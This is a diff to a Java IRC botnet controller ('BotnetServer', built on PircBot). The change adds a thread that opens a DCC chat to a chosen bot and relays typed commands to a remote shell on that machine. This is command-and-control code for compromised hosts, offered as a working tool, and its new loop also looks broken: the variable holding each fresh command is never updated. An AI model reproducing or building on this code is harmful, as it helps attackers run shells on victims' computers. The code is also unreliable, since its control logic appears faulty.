@@ -1,6 +1,7 @@
 import java.io.*;
 import java.net.*;
 import java.util.*;
+
 import org.jibble.pircbot.*;
 
 public class BotnetServer extends PircBot {
@@ -12,7 +13,7 @@ public class BotnetServer extends PircBot {
 	private static final int TIMEOUT = 120000;
 	private Scanner input;
 	private boolean inChat;
-	private DccChat chat;
+	private ChatThread chat;
 	
 	public static void main(String[] args) {
 		BotnetServer bn = new BotnetServer();
@@ -95,31 +96,44 @@ public class BotnetServer extends PircBot {
 			}
 		} else if (s.startsWith(":")) {
 			sendMessage(CHANNEL, s.substring(1));
-		} else {
+		} else if (!s.isEmpty()) {
 			sendRawLine(s);
 		}
 	}
 	
 	private void engageInChat(String botNick, int timeout) {
-		chat = dccSendChatRequest(botNick, timeout);
-		if (chat != null) {
-			System.out.println("Chat successful");
+		DccChat chatObj = dccSendChatRequest(botNick, timeout);
+		chat = new ChatThread(chatObj);
+		
+		//Pause until we are done chatting
+		while(chat.isAlive());
+	}
+	
+	private class ChatThread extends Thread {
+		DccChat chat;
+		public ChatThread(DccChat chat) {
+			this.chat = chat;
+			if (chat != null) this.start();
+		}
+		public void run() {
+			Scanner input = new Scanner(System.in);
+			Scanner shellin = new Scanner(chat.getBufferedReader());
 			try {
-				chat.readLine();
-				String response = input.nextLine();
-				while (response.equalsIgnoreCase("quit shell")) {
-					chat.sendLine(response);
-					System.out.println(chat.readLine());
+				System.out.print(shellin.nextLine());
+				String command = input.nextLine();
+				while (!command.equalsIgnoreCase("quit shell")) {
+					chat.sendLine(command);
+					String response = "";
+					while (shellin.hasNextLine()) {
+						response += shellin.nextLine() + "\n";
+					}
+					System.out.println(response);
 					response = input.nextLine();
 				}
-				chat.sendLine(response);
+				chat.sendLine(command);
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
 		}
-	}
-	
-	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
-		//Perhaps this will enable chatting?
 	}
 }
